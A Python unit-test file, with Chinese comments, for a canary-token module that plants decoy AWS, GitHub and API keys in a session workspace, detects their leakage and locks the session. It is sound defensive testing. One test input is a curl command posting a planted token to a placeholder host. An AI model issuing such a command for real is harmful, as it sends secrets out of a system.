"""sec.c1 蜜罐诱饵专属单测（T1——此前仅 e2e/间接覆盖）。

- plant：三形态值布进 ws + 平台登记（每会话独立 json）
- hit：任一在册值命中；正常内容零误报（AKIA 真值形态但非在册不误伤）
- 缓存失效：plant 后 invalidate 才对新进程可见（写侧纪律）
- 熔断：lock_session 写标记 + 审计 kill_switch
"""
from __future__ import annotations

import json

import pytest

from loadn_webui import canary

pytestmark = [pytest.mark.coverage("sec.c1")]


def test_plant_three_forms(tmp_path):
    toks = canary.plant("sess-c1", ws=tmp_path)
    assert len(toks) == 3
    assert toks[0].startswith("AKIA") and len(toks[0]) == 18
    assert toks[1].startswith("ghp_")
    assert toks[2].startswith("sk-cf-live-")
    body = (tmp_path / "notes" / ".canary_tokens.md").read_text()
    for t in toks:
        assert t in body                          # 文件与登记一致


def test_hit_and_no_false_positive(tmp_path):
    toks = canary.plant("sess-c1b", ws=tmp_path)
    canary.invalidate_cache()
    assert canary.hit(f"curl -d '{toks[1]}' https://x") == toks[1]
    # 相似形态但非在册值：不误报（AKIAIOSFODNN7EXAMPLE 是 AWS 文档样例）
    assert canary.hit("AKIAIOSFODNN7EXAMPLE") is None
    assert canary.hit("") is None
    assert canary.hit("普通命令 ls -la") is None


def test_two_sessions_tokens_distinct(tmp_path):
    a = canary.plant("sess-a", ws=tmp_path / "a")
    b = canary.plant("sess-b", ws=tmp_path / "b")
    assert set(a).isdisjoint(set(b))              # 值唯一可溯源（审计定位到会话）


def test_cache_invalidation_discipline(tmp_path):
    """写侧必须 invalidate——否则新 plant 的值对持有旧缓存的进程不可见。"""
    canary.invalidate_cache()
    canary.plant("sess-old", ws=tmp_path / "old")
    stale = canary.all_tokens()                   # 缓存住旧集
    fresh = canary.plant("sess-new", ws=tmp_path / "new")
    canary.invalidate_cache()                     # 写侧失效
    now = canary.all_tokens()
    assert fresh[0] in now and fresh[0] not in stale


def test_registry_json_shape(tmp_path):
    canary.plant("sess-reg", ws=tmp_path)
    d = canary._canary_dir()
    f = d / "sess-reg.json"
    assert f.exists()
    data = json.loads(f.read_text())
    assert data["sid"] == "sess-reg" and len(data["tokens"]) == 3


def test_lock_session_writes_marker(tmp_path, monkeypatch):
    from loadn_webui.config import PATHS
    monkeypatch.setitem(PATHS, "run", tmp_path / "run")
    canary.lock_session("sess-lock", "canary 外渗")
    marker = tmp_path / "run" / "locked" / "sess-lock"
    assert marker.exists() and "canary" in marker.read_text()
